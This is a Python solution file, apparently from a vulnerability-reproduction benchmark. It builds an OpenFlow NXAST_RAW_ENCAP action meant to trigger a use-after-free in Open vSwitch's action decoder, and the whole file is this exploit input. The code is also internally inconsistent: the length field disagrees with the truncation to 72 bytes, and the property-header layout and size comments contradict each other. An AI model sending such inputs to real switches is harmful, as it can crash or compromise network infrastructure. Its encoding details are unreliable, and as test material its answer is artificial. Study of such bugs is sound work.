import os
import struct
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build the PoC based on the vulnerability description
        # The vulnerability is in decode_NXAST_RAW_ENCAP which uses old pointer
        # after decode_ed_prop() reallocates the ofpbuf
        
        # Structure for NXAST_RAW_ENCAP action:
        # - OpenFlow experimenter action header
        # - NXAST_RAW_ENCAP specific fields
        # - Encapsulation data
        # - ED_PROP properties
        
        poc = bytearray()
        
        # OpenFlow experimenter action header
        # type = OFPAT_EXPERIMENTER (0xffff)
        poc += struct.pack('!H', 0xffff)  # type
        # length will be calculated later
        poc += struct.pack('!H', 0)  # placeholder for length
        # experimenter = NX_EXPERIMENTER_ID (0x00002320)
        poc += struct.pack('!I', 0x00002320)  # experimenter
        
        # NXAST_RAW_ENCAP subtype
        poc += struct.pack('!H', 0x0023)  # NXAST_RAW_ENCAP
        
        # encap_len - total length of encapsulation
        # We'll make this small to trigger reallocation later
        poc += struct.pack('!H', 8)  # encap_len
        
        # encap - simple encapsulation (8 bytes)
        poc += struct.pack('!I', 0x08004500)  # IPv4 header start
        poc += struct.pack('!I', 0x00000000)  # More IPv4
        
        # Now add ED_PROP properties that will cause reallocation
        # The key is to make the current buffer nearly full so that
        # decode_ed_prop() needs to reallocate
        
        # ED_PROP header: type (8 bytes) + len (8 bytes)
        # Use a large property type that requires reallocation
        poc += struct.pack('!Q', 0x0000000000000001)  # property type
        poc += struct.pack('!Q', 40)  # property length
        
        # Property data that will trigger reallocation
        # Fill with data that will cause the buffer to need expansion
        poc += b'A' * 40
        
        # Update the action length (total length including header)
        # OFP action header is 8 bytes (type + len)
        # Experimenter action adds 4 more bytes for experimenter
        # NX action adds 2 more bytes for subtype
        # So base header is 14 bytes
        total_len = len(poc)
        struct.pack_into('!H', poc, 2, total_len)
        
        # Ensure exactly 72 bytes
        if len(poc) != 72:
            # Pad or truncate to exactly 72 bytes
            poc = poc[:72] if len(poc) > 72 else poc + b'\x00' * (72 - len(poc))
        
        return bytes(poc)
